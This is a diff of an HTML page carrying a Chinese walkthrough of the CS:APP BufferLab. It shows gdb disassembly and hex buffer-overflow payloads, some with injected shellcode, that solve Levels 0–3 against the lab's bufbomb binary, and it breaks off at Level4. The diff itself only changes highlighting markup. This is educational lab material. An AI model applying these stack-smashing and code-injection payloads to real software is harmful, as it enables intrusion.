@@ -8,13 +8,14 @@
     <title>
         Document
     </title>
-    <link rel='stylesheet' href=../../../css/prism.css /><link rel='stylesheet' href=../../../css/index.css />
+    <link rel='stylesheet' href=../../../css/index.css />
+    <link rel='stylesheet' href=../../../css/shell.css /><link rel='stylesheet' href=../../../css/c.css />
     <link rel="icon" href="https://raw.githubusercontent.com/learner-lu/picbed/master/logo.png">
 </head>
 
 <body class="light">
     <a href="https://github.com/luzhixing12345/csapplab.git" target="_blank" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
-    <div class="header-navigator"><ul><li><a href="#h1-0">BufferLab</a><ul><li><a href="#h2-1">前言</a></li></ul><ul><li><a href="#h2-2">实验报告</a><ul><li><a href="#h3-3">Level0</a></li></ul><ul><li><a href="#h3-4">Level1</a></li></ul><ul><li><a href="#h3-5">Level2</a></li></ul><ul><li><a href="#h3-6">Level3</a></li></ul><ul><li><a href="#h3-7">Level4</a></li></ul></li></ul></li></ul></div><div class='markdown-body'><h1 id="h1-0">BufferLab</h1><h2 id="h2-1">前言</h2><p>本次实验和上次03-AttackLab很相似,同样考察的是缓冲区溢出,只不过实验的环境换成了32位(IA32)</p><p>本文默认读者已有03-AttackLab的实验经历,背景知识不再赘述,相关过程简略</p><p>本次实验采用 <code>bovik</code> 用户,cookie值为 <code>0x1005b2b7</code></p><p><b>需要 32 位工具链</b></p><pre><code class="language-bash">sudo apt-get install gcc-multilib</code></pre><h2 id="h2-2">实验报告</h2><p>本次实验五关是需要根据实验的文档来依次解决的,开始之前请仔细阅读文档</p><h3 id="h3-3">Level0</h3><p>第一关的要求是返回到smoke,test调用了getbuf,getbuf的汇编如下</p><pre><code class="language-txt">0x080491f4 &lt;+0&gt;:     push   %ebp
+    <div class="header-navigator"><ul><li><a href="#h1-0">BufferLab</a><ul><li><a href="#h2-1">前言</a></li></ul><ul><li><a href="#h2-2">实验报告</a><ul><li><a href="#h3-3">Level0</a></li></ul><ul><li><a href="#h3-4">Level1</a></li></ul><ul><li><a href="#h3-5">Level2</a></li></ul><ul><li><a href="#h3-6">Level3</a></li></ul><ul><li><a href="#h3-7">Level4</a></li></ul></li></ul></li></ul></div><div class='markdown-body'><h1 id="h1-0">BufferLab</h1><h2 id="h2-1">前言</h2><p>本次实验和上次03-AttackLab很相似,同样考察的是缓冲区溢出,只不过实验的环境换成了32位(IA32)</p><p>本文默认读者已有03-AttackLab的实验经历,背景知识不再赘述,相关过程简略</p><p>本次实验采用 <code>bovik</code> 用户,cookie值为 <code>0x1005b2b7</code></p><p><b>需要 32 位工具链</b></p><pre class="language-shell"><code><span class="Token Program ID">sudo</span><span class="Token SPACE"> </span><span class="Token ID">apt-get</span><span class="Token SPACE"> </span><span class="Token ID">install</span><span class="Token SPACE"> </span><span class="Token ID">gcc-multilib</span></code></pre><h2 id="h2-2">实验报告</h2><p>本次实验五关是需要根据实验的文档来依次解决的,开始之前请仔细阅读文档</p><h3 id="h3-3">Level0</h3><p>第一关的要求是返回到smoke,test调用了getbuf,getbuf的汇编如下</p><pre class="language-txt"><code>0x080491f4 &lt;+0&gt;:     push   %ebp
 0x080491f5 &lt;+1&gt;:     mov    %esp,%ebp
 0x080491f7 &lt;+3&gt;:     sub    $0x38,%esp
 0x080491fa &lt;+6&gt;:     lea    -0x28(%ebp),%eax
@@ -22,41 +23,41 @@
 0x08049200 &lt;+12&gt;:    call   0x8048cfa &lt;Gets&gt;
 0x08049205 &lt;+17&gt;:    mov    $0x1,%eax
 0x0804920a &lt;+22&gt;:    leave
-0x0804920b &lt;+23&gt;:    ret</code></pre><p>这里的leave是x86汇编的指令,相当于</p><pre><code class="language-txt">mov   %ebp, %esp
-pop   %ebp</code></pre><p>这里可以看出开辟的栈帧大小是0x38,实际用于输入的空间大小是0x28(40字节),但值得注意的是前面还 <code>push %ebp</code>,所以还有4字节</p><blockquote><p>注意是32位机</p></blockquote><p>可以查看到smoke的地址是 <code>0x08048c18</code></p><p>所以第一关的答案是</p><pre><code class="language-txt">00 00 00 00 00 00 00 00 00 00
+0x0804920b &lt;+23&gt;:    ret</code></pre><p>这里的leave是x86汇编的指令,相当于</p><pre class="language-txt"><code>mov   %ebp, %esp
+pop   %ebp</code></pre><p>这里可以看出开辟的栈帧大小是0x38,实际用于输入的空间大小是0x28(40字节),但值得注意的是前面还 <code>push %ebp</code>,所以还有4字节</p><blockquote><p>注意是32位机</p></blockquote><p>可以查看到smoke的地址是 <code>0x08048c18</code></p><p>所以第一关的答案是</p><pre class="language-txt"><code>00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00
-18 8c 04 08</code></pre><pre><code class="language-bash">$ ./hex2raw &lt; 0.txt | ./bufbomb -u bovik
-Userid: bovik
-Cookie: 0x1005b2b7
-Type string:Smoke!: You called smoke()
-VALID
-NICE JOB!</code></pre><h3 id="h3-4">Level1</h3><p>第二关是跳转到fizz函数并且使得参数 rdi的值是cookie的值</p><p>反汇编fizz得到</p><pre><code class="language-txt">0x08048c42 &lt;+0&gt;:     push   %ebp
+18 8c 04 08</code></pre><pre class="language-shell"><code><span class="Token VARIANT">$</span><span class="Token SPACE"> </span><span class="Token Program PATH">./hex2raw</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token SPACE"> </span><span class="Token NUMBER">0.</span><span class="Token ID">txt</span><span class="Token SPACE"> </span><span class="Token PIPE">|</span><span class="Token SPACE"> </span><span class="Token Program PATH">./bufbomb</span><span class="Token SPACE"> </span><span class="Token OPTION">-u</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Userid:</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Cookie:</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:Smoke</span><span class="Token BANG">!</span><span class="Token COLON">:</span><span class="Token SPACE"> </span><span class="Token ID">You</span><span class="Token SPACE"> </span><span class="Token ID">called</span><span class="Token SPACE"> </span><span class="Token Function ID">smoke</span><span class="brace-depth-0 Token LPAREN">(</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token LF">
+</span><span class="Token Program ID">VALID</span><span class="Token LF">
+</span><span class="Token Program ID">NICE</span><span class="Token SPACE"> </span><span class="Token ID">JOB</span><span class="Token BANG">!</span></code></pre><h3 id="h3-4">Level1</h3><p>第二关是跳转到fizz函数并且使得参数 rdi的值是cookie的值</p><p>反汇编fizz得到</p><pre class="language-txt"><code>0x08048c42 &lt;+0&gt;:     push   %ebp
 0x08048c43 &lt;+1&gt;:     mov    %esp,%ebp              # ebp = esp
 0x08048c45 &lt;+3&gt;:     sub    $0x18,%esp
 0x08048c48 &lt;+6&gt;:     mov    0x8(%ebp),%eax         # eax = (rsp+8)
 0x08048c4b &lt;+9&gt;:     cmp    0x804d108,%eax
-0x08048c51 &lt;+15&gt;:    jne    0x8048c79 &lt;fizz+55&gt;</code></pre><p>所以整个栈空间调用过程如图所示</p><p><img src="https://raw.githubusercontent.com/learner-lu/picbed/master/20221111014944.png" alt="20221111014944"></p><p>所以答案如下</p><pre><code class="language-txt">00 00 00 00 00 00 00 00 00 00
+0x08048c51 &lt;+15&gt;:    jne    0x8048c79 &lt;fizz+55&gt;</code></pre><p>所以整个栈空间调用过程如图所示</p><p><img src="https://raw.githubusercontent.com/learner-lu/picbed/master/20221111014944.png" alt="20221111014944"></p><p>所以答案如下</p><pre class="language-txt"><code>00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00
 42 8c 04 08
 00 00 00 00
-b7 b2 05 10</code></pre><pre><code class="language-bash">$ ./hex2raw &lt; 1.txt | ./bufbomb -u bovik
-Userid: bovik
-Cookie: 0x1005b2b7
-Type string:Fizz!: You called fizz(0x1005b2b7)
-VALID
-NICE JOB!</code></pre><h3 id="h3-5">Level2</h3><p>调用函数 bang, 同时需要修改全局变量 global_value 的值</p><p>思路类似,返回地址设为栈指针地址,直接修改全局变量的值</p><p>反汇编bang找到global_value的地址为 <code>0x804d100</code></p><pre><code class="language-bash">(gdb) disas bang
-Dump of assembler code for function bang:
-   0x08048c9d &lt;+0&gt;:     push   %ebp
-   0x08048c9e &lt;+1&gt;:     mov    %esp,%ebp
-   0x08048ca0 &lt;+3&gt;:     sub    $0x18,%esp
-   0x08048ca3 &lt;+6&gt;:     mov    0x804d100,%eax</code></pre><p>构造的汇编如下, a.s</p><pre><code class="language-x86asm">movl $0x1005b2b7,0x804d100
-ret</code></pre><p><code>gcc -c -m32 a.s</code> 编译得到 a.o, 这是一个 32 位的 elf 文件</p><p><code>objdump -d a.o</code> 反汇编得到的字节码如下</p><pre><code class="language-txt">level2.o:     file format elf32-i386
+b7 b2 05 10</code></pre><pre class="language-shell"><code><span class="Token VARIANT">$</span><span class="Token SPACE"> </span><span class="Token Program PATH">./hex2raw</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token SPACE"> </span><span class="Token NUMBER">1.</span><span class="Token ID">txt</span><span class="Token SPACE"> </span><span class="Token PIPE">|</span><span class="Token SPACE"> </span><span class="Token Program PATH">./bufbomb</span><span class="Token SPACE"> </span><span class="Token OPTION">-u</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Userid:</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Cookie:</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:Fizz</span><span class="Token BANG">!</span><span class="Token COLON">:</span><span class="Token SPACE"> </span><span class="Token ID">You</span><span class="Token SPACE"> </span><span class="Token ID">called</span><span class="Token SPACE"> </span><span class="Token Function ID">fizz</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token NUMBER">0x1005b2b7</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token LF">
+</span><span class="Token Program ID">VALID</span><span class="Token LF">
+</span><span class="Token Program ID">NICE</span><span class="Token SPACE"> </span><span class="Token ID">JOB</span><span class="Token BANG">!</span></code></pre><h3 id="h3-5">Level2</h3><p>调用函数 bang, 同时需要修改全局变量 global_value 的值</p><p>思路类似,返回地址设为栈指针地址,直接修改全局变量的值</p><p>反汇编bang找到global_value的地址为 <code>0x804d100</code></p><pre class="language-shell"><code><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">disas</span><span class="Token SPACE"> </span><span class="Token ID">bang</span><span class="Token LF">
+</span><span class="Token Program ID">Dump</span><span class="Token SPACE"> </span><span class="Token ID">of</span><span class="Token SPACE"> </span><span class="Token ID">assembler</span><span class="Token SPACE"> </span><span class="Token ID">code</span><span class="Token SPACE"> </span><span class="Keyword Token FOR">for</span><span class="Token SPACE"> </span><span class="Token ID">function</span><span class="Token SPACE"> </span><span class="Token ID">bang:</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x08048c9d</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">0</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">push</span><span class="Token SPACE">   </span><span class="Token MOD">%</span><span class="Token ID">ebp</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x08048c9e</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">1</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">mov</span><span class="Token SPACE">    </span><span class="Token MOD">%</span><span class="Token ID">esp</span><span class="Token COMMA">,</span><span class="Token MOD">%</span><span class="Token ID">ebp</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x08048ca0</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">3</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">sub</span><span class="Token SPACE">    </span><span class="Token VARIANT">$0x18</span><span class="Token COMMA">,</span><span class="Token MOD">%</span><span class="Token ID">esp</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x08048ca3</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">6</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">mov</span><span class="Token SPACE">    </span><span class="Token NUMBER">0x804d100</span><span class="Token COMMA">,</span><span class="Token MOD">%</span><span class="Token ID">eax</span></code></pre><p>构造的汇编如下, a.s</p><pre class="language-x86asm"><code>movl $0x1005b2b7,0x804d100
+ret</code></pre><p><code>gcc -c -m32 a.s</code> 编译得到 a.o, 这是一个 32 位的 elf 文件</p><p><code>objdump -d a.o</code> 反汇编得到的字节码如下</p><pre class="language-txt"><code>level2.o:     file format elf32-i386
 
 
 Disassembly of section .text:
@@ -64,43 +65,43 @@ Disassembly of section .text:
 00000000 &lt;.text&gt;:
    0:   c7 05 00 d1 04 08 b7    movl   $0x1005b2b7,0x804d100
    7:   b2 05 10
-   a:   c3                      ret</code></pre><p>通过打断点的方式得到下方的栈指针的值为 <code>0x55683588</code></p><pre><code class="language-bash">(gdb) disas getbuf
-Dump of assembler code for function getbuf:
-   0x080491f4 &lt;+0&gt;:     push   %ebp
-   0x080491f5 &lt;+1&gt;:     mov    %esp,%ebp
-   0x080491f7 &lt;+3&gt;:     sub    $0x38,%esp
-   0x080491fa &lt;+6&gt;:     lea    -0x28(%ebp),%eax
-   0x080491fd &lt;+9&gt;:     mov    %eax,(%esp)
-   0x08049200 &lt;+12&gt;:    call   0x8048cfa &lt;Gets&gt;
-   0x08049205 &lt;+17&gt;:    mov    $0x1,%eax
-   0x0804920a &lt;+22&gt;:    leave
-   0x0804920b &lt;+23&gt;:    ret
-End of assembler dump.
-(gdb) b *0x080491fd
-Breakpoint 1 at 0x80491fd
-(gdb) r -u bovik
-Starting program: /root/csapp/04Buffer Lab (IA32)/buflab-handout/bufbomb -u bovik
-Userid: bovik
-Cookie: 0x1005b2b7
-
-Breakpoint 1, 0x080491fd in getbuf ()
-(gdb) info r eax
-eax            0x55683588       1432892808</code></pre><p>然后得到bang的地址为 <code>0x08048c9d</code>,所以本题答案如下</p><pre><code class="language-txt">c7 05 00 d1 04 08 b7 b2 05 10
+   a:   c3                      ret</code></pre><p>通过打断点的方式得到下方的栈指针的值为 <code>0x55683588</code></p><pre class="language-shell"><code><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">disas</span><span class="Token SPACE"> </span><span class="Token ID">getbuf</span><span class="Token LF">
+</span><span class="Token Program ID">Dump</span><span class="Token SPACE"> </span><span class="Token ID">of</span><span class="Token SPACE"> </span><span class="Token ID">assembler</span><span class="Token SPACE"> </span><span class="Token ID">code</span><span class="Token SPACE"> </span><span class="Keyword Token FOR">for</span><span class="Token SPACE"> </span><span class="Token ID">function</span><span class="Token SPACE"> </span><span class="Token ID">getbuf:</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x080491f4</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">0</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">push</span><span class="Token SPACE">   </span><span class="Token MOD">%</span><span class="Token ID">ebp</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x080491f5</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">1</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">mov</span><span class="Token SPACE">    </span><span class="Token MOD">%</span><span class="Token ID">esp</span><span class="Token COMMA">,</span><span class="Token MOD">%</span><span class="Token ID">ebp</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x080491f7</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">3</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">sub</span><span class="Token SPACE">    </span><span class="Token VARIANT">$0x38</span><span class="Token COMMA">,</span><span class="Token MOD">%</span><span class="Token ID">esp</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x080491fa</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">6</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">lea</span><span class="Token SPACE">    </span><span class="Token OPTION">-0x28</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token MOD">%</span><span class="Token ID">ebp</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token COMMA">,</span><span class="Token MOD">%</span><span class="Token ID">eax</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x080491fd</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">9</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">mov</span><span class="Token SPACE">    </span><span class="Token MOD">%</span><span class="Token ID">eax</span><span class="Token COMMA">,</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token MOD">%</span><span class="Token ID">esp</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x08049200</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">12</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">    </span><span class="Token Program ID">call</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x8048cfa</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token ID">Gets</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x08049205</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">17</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">    </span><span class="Token Program ID">mov</span><span class="Token SPACE">    </span><span class="Token VARIANT">$0x1</span><span class="Token COMMA">,</span><span class="Token MOD">%</span><span class="Token ID">eax</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x0804920a</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">22</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">    </span><span class="Token Program ID">leave</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x0804920b</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">23</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">    </span><span class="Token Program ID">ret</span><span class="Token LF">
+</span><span class="Token Program ID">End</span><span class="Token SPACE"> </span><span class="Token ID">of</span><span class="Token SPACE"> </span><span class="Token ID">assembler</span><span class="Token SPACE"> </span><span class="Token ID">dump.</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">b</span><span class="Token SPACE"> </span><span class="Token MUL">*</span><span class="Token NUMBER">0x080491fd</span><span class="Token LF">
+</span><span class="Token Program ID">Breakpoint</span><span class="Token SPACE"> </span><span class="Token NUMBER">1</span><span class="Token SPACE"> </span><span class="Token ID">at</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x80491fd</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">r</span><span class="Token SPACE"> </span><span class="Token OPTION">-u</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Starting</span><span class="Token SPACE"> </span><span class="Token ID">program:</span><span class="Token SPACE"> </span><span class="Token PATH">/root/csapp/04Buffer</span><span class="Token SPACE"> </span><span class="Token Function ID">Lab</span><span class="Token SPACE"> </span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token ID">IA32</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token PATH">/buflab-handout/bufbomb</span><span class="Token SPACE"> </span><span class="Token OPTION">-u</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Userid:</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Cookie:</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token LF">
+</span><span class="Token Program ID">Breakpoint</span><span class="Token SPACE"> </span><span class="Token NUMBER">1</span><span class="Token COMMA">,</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x080491fd</span><span class="Token SPACE"> </span><span class="Keyword Token IN">in</span><span class="Token SPACE"> </span><span class="Token Function ID">getbuf</span><span class="Token SPACE"> </span><span class="brace-depth-0 Token LPAREN">(</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">info</span><span class="Token SPACE"> </span><span class="Token ID">r</span><span class="Token SPACE"> </span><span class="Token ID">eax</span><span class="Token LF">
+</span><span class="Token Program ID">eax</span><span class="Token SPACE">            </span><span class="Token NUMBER">0x55683588</span><span class="Token SPACE">       </span><span class="Token NUMBER">1432892808</span></code></pre><p>然后得到bang的地址为 <code>0x08048c9d</code>,所以本题答案如下</p><pre class="language-txt"><code>c7 05 00 d1 04 08 b7 b2 05 10
 c3 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00
 88 35 68 55
-9d 8c 04 08</code></pre><pre><code class="language-bash">$ ./hex2raw &lt; 2.txt | ./bufbomb -u bovik
-Userid: bovik
-Cookie: 0x1005b2b7
-Type string:Bang!: You set global_value to 0x1005b2b7
-VALID
-NICE JOB!</code></pre><h3 id="h3-6">Level3</h3><p>本关要求仍返回到 test, 不过返回值要修改为 cookie</p><p>首先拿到test调用getbuf后原本的返回地址 <code>0x08048dbe</code>,接着注意到getbuf还push了ebp,所以我们还需要打断点得到ebp的值 <code>0x556835e0</code></p><pre><code class="language-bash">(gdb) info r ebp
-ebp            0x556835e0       0x556835e0 &lt;_reserved+1037792&gt;</code></pre><p>所以对应的汇编如下</p><pre><code class="language-x86asm">movl $0x1005b2b7,%eax
+9d 8c 04 08</code></pre><pre class="language-shell"><code><span class="Token VARIANT">$</span><span class="Token SPACE"> </span><span class="Token Program PATH">./hex2raw</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token SPACE"> </span><span class="Token NUMBER">2.</span><span class="Token ID">txt</span><span class="Token SPACE"> </span><span class="Token PIPE">|</span><span class="Token SPACE"> </span><span class="Token Program PATH">./bufbomb</span><span class="Token SPACE"> </span><span class="Token OPTION">-u</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Userid:</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Cookie:</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:Bang</span><span class="Token BANG">!</span><span class="Token COLON">:</span><span class="Token SPACE"> </span><span class="Token ID">You</span><span class="Token SPACE"> </span><span class="Token ID">set</span><span class="Token SPACE"> </span><span class="Token ID">global_value</span><span class="Token SPACE"> </span><span class="Token ID">to</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token Program ID">VALID</span><span class="Token LF">
+</span><span class="Token Program ID">NICE</span><span class="Token SPACE"> </span><span class="Token ID">JOB</span><span class="Token BANG">!</span></code></pre><h3 id="h3-6">Level3</h3><p>本关要求仍返回到 test, 不过返回值要修改为 cookie</p><p>首先拿到test调用getbuf后原本的返回地址 <code>0x08048dbe</code>,接着注意到getbuf还push了ebp,所以我们还需要打断点得到ebp的值 <code>0x556835e0</code></p><pre class="language-shell"><code><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">info</span><span class="Token SPACE"> </span><span class="Token ID">r</span><span class="Token SPACE"> </span><span class="Token ID">ebp</span><span class="Token LF">
+</span><span class="Token Program ID">ebp</span><span class="Token SPACE">            </span><span class="Token NUMBER">0x556835e0</span><span class="Token SPACE">       </span><span class="Token NUMBER">0x556835e0</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token ID">_reserved+1037792</span><span class="Token REDIRECT_TO">&gt;</span></code></pre><p>所以对应的汇编如下</p><pre class="language-x86asm"><code>movl $0x1005b2b7,%eax
 movl $0x556835e0,%ebp
 push $0x8048dbe
-ret</code></pre><p>字节码得到</p><pre><code class="language-txt">level3.o:     file format elf32-i386
+ret</code></pre><p>字节码得到</p><pre class="language-txt"><code>level3.o:     file format elf32-i386
 
 
 Disassembly of section .text:
@@ -109,83 +110,83 @@ Disassembly of section .text:
    0:   b8 b7 b2 05 10          mov    $0x1005b2b7,%eax
    5:   bd e0 35 68 55          mov    $0x556835e0,%ebp
    a:   68 be 8d 04 08          push   $0x8048dbe
-   f:   c3                      ret</code></pre><p>所以本关答案为</p><pre><code class="language-txt">b8 b7 b2 05 10 bd e0 35 68 55
+   f:   c3                      ret</code></pre><p>所以本关答案为</p><pre class="language-txt"><code>b8 b7 b2 05 10 bd e0 35 68 55
 68 be 8d 04 08 c3 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00
-88 35 68 55</code></pre><pre><code class="language-bash">$ ./hex2raw &lt; 3.txt | ./bufbomb -u bovik
-Userid: bovik
-Cookie: 0x1005b2b7
-Type string:Boom!: getbuf returned 0x1005b2b7
-VALID
-NICE JOB!</code></pre><h3 id="h3-7">Level4</h3><p>本关就是栈地址的随机化,有一个+-240的偏差,所以不能准确的指定到某一个地址. 我们可以打一个断点来查看五次调用的时候的栈起始地址</p><pre><code class="language-bash">(gdb) disas getbufn
